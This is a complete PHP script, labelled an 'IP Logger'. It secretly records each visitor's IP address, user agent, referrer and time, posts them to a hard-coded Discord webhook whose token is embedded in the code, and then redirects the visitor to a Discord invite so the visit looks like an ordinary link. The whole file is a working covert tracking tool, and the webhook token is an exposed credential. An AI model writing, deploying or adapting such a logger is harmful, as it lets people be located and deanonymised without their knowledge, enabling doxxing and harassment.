<?php
// Discord Webhook URL (replace with your actual webhook URL)
$webhook_url = 'https://discord.com/api/webhooks/1383440478590074991/R-XypnoW6z2c43QcG8E4Q0k15hXis34HsZLvrQvNJ259IcWyitqXT-eXSbxyCZeTXbW2';

// Get user information
$ip_address = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$referrer = $_SERVER['HTTP_REFERER'] ?? 'No referrer';
$timestamp = date('Y-m-d H:i:s');

// Additional IP detection methods
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

// Create log data
$data = [
    'content' => "New IP Logged",
    'embeds' => [
        [
            'title' => 'Visitor Information',
            'fields' => [
                ['name' => 'IP Address', 'value' => $ip_address, 'inline' => true],
                ['name' => 'User Agent', 'value' => substr($user_agent, 0, 1000), 'inline' => true],
                ['name' => 'Referrer', 'value' => substr($referrer, 0, 1000)],
                ['name' => 'Timestamp', 'value' => $timestamp]
            ],
            'color' => 5814783,
            'footer' => ['text' => 'IP Logger']
        ]
    ]
];

// Send to Discord
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_exec($ch);
curl_close($ch);

// Redirect to Discord
header('Location: https://discord.gg/k86MEegBrw');
exit();
?>